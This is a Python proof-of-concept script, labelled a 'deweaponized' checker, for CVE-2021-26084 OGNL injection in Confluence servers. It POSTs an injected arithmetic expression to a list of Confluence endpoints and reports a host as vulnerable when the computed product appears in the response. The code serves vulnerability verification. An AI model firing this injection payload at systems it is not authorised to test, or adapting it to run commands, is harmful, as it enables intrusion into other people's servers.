#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
@File    :   PoC.py
@Time    :   2021/09/01 14:16:26
@Author  :   _0xf4n9x_,
@Version :   1.1
@Contact :   fanq.xu@gmail.com
"""

"""
modified by @xstp on 2022/03/13
deweaponized ognl checker
"""


import random
import requests
import sys
import os
import urllib3
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings()

def usage():
    print("Eg: \n    python3 PoC.py -u http://127.0.0.1")

def poc(host):
    paths = ['/pages/createpage-entervariables.action?SpaceKey=x', '/pages/createpage-entervariables.action', '/confluence/pages/createpage-entervariables.action?SpaceKey=x', '/confluence/pages/createpage-entervariables.action', '/wiki/pages/createpage-entervariables.action?SpaceKey=x', '/wiki/pages/createpage-entervariables.action', '/pages/doenterpagevariables.action', '/pages/createpage.action?spaceKey=myproj', '/pages/templates2/viewpagetemplate.action', '/pages/createpage-entervariables.action', '/template/custom/content-editor', '/templates/editor-preload-container', '/users/user-dark-features']
    for path in paths:
        url = host + path
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
            "Content-Type": "application/x-www-form-urlencoded"}
        num1 = random.randint(100, 10000)
        num2 = random.randint(100, 10000)
        sum = num1 * num2
        params = {
        "queryString": "aaaa\\u0027+{" + str(num1) + "*" + str(num2) + "}+\\u0027bbb"}
        try:
            res = requests.post(url, headers=headers, data=params,
                                timeout=6, verify=False, proxies=None)
            if str(sum) in res.text:
                print("[+] " + host + path + " is vulnerable!")
                return path
            else:
                continue
        except:
            continue
    print("[-] " + host + " is not vulnerable!")
    return 0

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="CVE-2021-26084 Remote Code Execution on Confluence Servers")
    parser.add_argument('-u', '--url', type=str,
                        help="vulnerability verification for individual websites")
    args = parser.parse_args()
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-u', '--url']:
            poc(args.url)
    else:
        parser.print_help()
        usage()

